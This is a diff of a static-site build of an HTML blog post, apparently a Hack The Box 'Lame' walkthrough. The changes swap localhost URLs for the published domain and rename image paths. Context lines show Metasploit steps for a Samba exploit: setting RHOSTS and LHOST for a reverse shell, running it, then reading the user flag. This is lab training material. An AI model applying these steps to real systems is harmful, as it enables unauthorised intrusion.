@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><script src="/donatello-blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=donatello-blog/livereload" data-no-instant defer></script>
+    <head>
         <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 
@@ -13,7 +13,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="http://localhost:1313/donatello-blog/posts/2024/lame-machine-htb/" />
+<link rel="canonical" href="https://d0n4t3ll0-64.github.io/donatello-blog/posts/2024/lame-machine-htb/" />
 
 
     <title>
@@ -30,14 +30,13 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="/donatello-blog/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="/donatello-blog/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="/donatello-blog/favicon-16x16.png">
-    <link rel="manifest" href="/donatello-blog/site.webmanifest">
-    <link rel="mask-icon" href="/donatello-blog/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="/donatello-blog/favicon.ico">
-    <meta name="msapplication-TileColor" content="">
-
+<link rel="apple-touch-icon" sizes="180x180" href="/donatello-blog/%20apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/donatello-blog/%20favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/donatello-blog/%20favicon-16x16.png">
+<link rel="manifest" href="/donatello-blog/%20site.webmanifest">
+<link rel="mask-icon" href="/donatello-blog/%20safari-pinned-tab.svg" color="">
+<link rel="shortcut icon" href="/donatello-blog/%20favicon.ico">
+<meta name="msapplication-TileColor" content="">
 
 
   <meta itemprop="name" content="Lame machine HTB">
@@ -56,20 +55,6 @@ Target IP: 10.129.79.228
 Enumeration Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.
 Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports and services:">
 
-
-
-    <meta property="og:url" content="http://localhost:1313/donatello-blog/posts/2024/lame-machine-htb/">
-  <meta property="og:site_name" content="d0natell0&#39;s Blog">
-  <meta property="og:title" content="Lame machine HTB">
-  <meta property="og:description" content="Introduction Lame is a beginner-level machine from Hack The Box, perfect for those starting their journey in penetration testing. This walkthrough will guide you through the process of compromising the machine, explaining each step and tool used along the way.
-Target IP: 10.129.79.228
-Enumeration Enumeration is the first and crucial step in any penetration test. It involves gathering information about the target system to identify potential vulnerabilities.
-Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports and services:">
-  <meta property="og:locale" content="en">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2024-07-17T22:42:00+03:00">
-    <meta property="article:modified_time" content="2024-07-17T22:42:00+03:00">
 
 
 
@@ -116,7 +101,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="/donatello-blog/news">News</a></li><li><a href="/donatello-blog/posts">Posts</a></li><li><a href="/donatello-blog/tools">Tools</a></li>
+    <ul class="menu__inner"><li><a href="/donatello-blog/news">News</a></li><li><a href="/donatello-blog/posts">Posts</a></li><li><a href="/donatello-blog/pentesting-tools">Tools</a></li>
     </ul>
 </nav>
 
@@ -155,7 +140,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
     
     <div class="post-header">
       
-      <img src="http://localhost:1313/donatello-blog/lame-machine/Lame.png" alt="Lame machine HTB" />
+      <img src="https://d0n4t3ll0-64.github.io/donatello-blog/lame-machine-img/Lame.png" alt="Lame machine HTB" />
       
 
       
@@ -264,7 +249,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 <p><strong>Search for the Samba exploit:</strong></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; search samba
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/1.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/1.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
 
 
 <hr>
@@ -273,7 +258,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 </span></span><span style="display:flex;"><span>msfconsole&gt; set RHOSTS 10.129.79.228
 </span></span><span style="display:flex;"><span>msfconsole&gt; set LHOST <span style="color:#f92672">[</span>Your IP<span style="color:#f92672">]</span>
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/2.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/2.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
 
 
 <p>Here, we&rsquo;re setting up the exploit with our target IP (RHOSTS) and our own IP (LHOST) for the reverse shell connection.</p>
@@ -281,7 +266,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 <p>Run the exploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole&gt; run
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/3.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/3.png"  alt="metasploit"  class="center"  style="border-radius: 8px;"  />
 
 
 <hr>
@@ -291,7 +276,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 <p>Navigate to root directory:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd root
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/4.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/4.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
 
 
 <hr>
@@ -305,32 +290,32 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 <p>This file contains user account information.</p>
 </blockquote>
 <p>
-    <img src="../../../lame-machine/5.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/5.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
 
 
 
-    <img src="../../../lame-machine/6.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/6.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
 
 </p>
 <hr>
 <p>Switch to user &lsquo;makis&rsquo;:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su makis
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/7.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/7.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
 
 
 <hr>
 <p>Navigate to makis&rsquo;s home directory:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd 
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/8.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/8.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
 
 
 <hr>
 <p>Cat the user flag:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat user.txt
 </span></span></code></pre></div>
-    <img src="../../../lame-machine/9.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
+    <img src="../../../lame-machine-img/9.png"  alt="reverse-shell"  class="center"  style="border-radius: 8px;"  />
 
 
 <hr>
@@ -398,7 +383,7 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
 
             
             <span class="button next">
-                <a href="http://localhost:1313/donatello-blog/posts/2024/nibbles-machine-htb/">
+                <a href="https://d0n4t3ll0-64.github.io/donatello-blog/posts/2024/nibbles-machine-htb/">
                     <span class="button__text">Nibbles Machine HTB</span>
                     <span class="button__icon">→</span>
                 </a>
@@ -424,9 +409,9 @@ Initial Nmap Scan We start with a comprehensive Nmap scan to discover open ports
     <div class="footer__inner">
         <div class="footer__content">
             <span>&copy; 2024</span>
-            <span><a href="http://localhost:1313/donatello-blog/"></a></span>
+            <span><a href="https://d0n4t3ll0-64.github.io/donatello-blog/"></a></span>
             <span></span>
-            <span><a href="http://localhost:1313/donatello-blog/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            <span><a href="https://d0n4t3ll0-64.github.io/donatello-blog/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
             
         </div>
     </div>
